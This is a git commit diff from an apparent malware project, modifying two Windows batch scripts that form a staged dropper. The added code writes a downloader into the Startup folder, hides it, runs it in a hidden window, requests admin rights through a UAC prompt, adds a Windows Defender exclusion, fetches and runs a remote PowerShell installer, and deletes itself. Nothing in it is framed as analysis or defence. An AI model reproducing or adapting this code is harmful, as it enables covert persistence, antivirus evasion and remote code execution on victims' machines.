de4d4ff76aa2388651a05539cecfe2a678a537fb
CHEPHYTY <soumyahembra123@gmail.com>
2024-05-20 22:41:54 +0530

    plz work 1

--- files/wget.cmd
+++ files/wget.cmd
@@ -1,13 +1,15 @@
 @echo off
 
 :: BatchGotAdmin
-:-------------------------------
-@REM ---> check for permissions
-IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
-    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+:-------------------------------------
+REM  --> Check for permissions
+    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) ELSE (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 )
 
-@REM ---> if error flag set, we do not have admin.
+REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
@@ -15,7 +17,7 @@ if '%errorlevel%' NEQ '0' (
 
 :UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    set params=%*
+    set params= %*
     echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
 
     "%temp%\getadmin.vbs"
@@ -25,9 +27,10 @@ if '%errorlevel%' NEQ '0' (
 :gotAdmin
     pushd "%CD%"
     CD /D "%~dp0"
+:--------------------------------------   
 
 @REM disable defender and execute downloaded script
-powershell -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/installer.ps1 -OutFile installer.ps1; Add-MpPreference -ExclusionPath '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup'; .\installer.ps1"
+powershell -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/installer.ps1 -OutFile installer.ps1"; Add-MpPreference -ExclusionPath '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup'; .\installer.ps1"
 
 @REM self delete
-@REM del "%~f0"
+del "%~f0"
--- initial.cmd
+++ initial.cmd
@@ -6,7 +6,7 @@ REM move into startup directory
 REM variables 
 REM INITIALPATH capture the current path of the dir
 set "INITIALPATH=%cd%" 
-REM  STARTUP capture the path of the microsoft startup file
+REM STARTUP capture the path of the microsoft startup file
 set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 REM move into startup directory
@@ -14,19 +14,16 @@ cd /d "%STARTUP%"
 
 REM TODO: Build out stage two
 REM write payloads to startup
-@REM https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/wget.cmd
+(echo powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/wget.cmd' -Outfile wget.cmd") > wget.cmd
 
-@REM (echo powershell -c "Invoke-WebRequest -Uri 'https://videos.pexels.com/video-files/2759477/2759477-uhd_3840_2160_30fps.mp4' -Outfile 'hello.mp4'") > wget.cmd
-(echo powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/wget.cmd' -Outfile 'wget.cmd'") > wget.cmd
-
-REM hide the stage2.cmd file
+REM hide the wget.cmd file
 attrib +h wget.cmd
- 
-REM run payload 
+
+REM run payload
 powershell -windowstyle hidden -Command "Start-Process cmd.exe -ArgumentList '/c %STARTUP%\wget.cmd' -WindowStyle Hidden"
 
 REM cd back into initial location
-REM cd /d "%INITIALPATH%"
+cd /d "%INITIALPATH%"
 
-REM @REM self-delete without error message
-REM start /b "" cmd /c del "%~f0"&exit
+REM self-delete without error message
+start /b "" cmd /c del "%~f0"&exit
